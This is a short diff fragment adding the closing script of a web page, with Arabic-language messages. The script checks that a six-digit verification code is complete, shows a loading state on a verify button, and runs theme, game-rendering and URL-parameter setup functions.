+            if (enteredCode.length !== 6) {
+                e.preventDefault();
+                showToast('يرجى إدخال الرمز كاملاً', 'error');
+                return;
+            }
+
+            const btn = document.getElementById('verifyBtn');
+            btn.innerHTML = '<div class="loading-spinner"></div> جاري التحقق...';
+            btn.disabled = true;
+        });
+
+        // Initialize
+        initTheme();
+        renderGames();
+        checkUrlParams();
+    </script>
+
+
+
+</body></html>
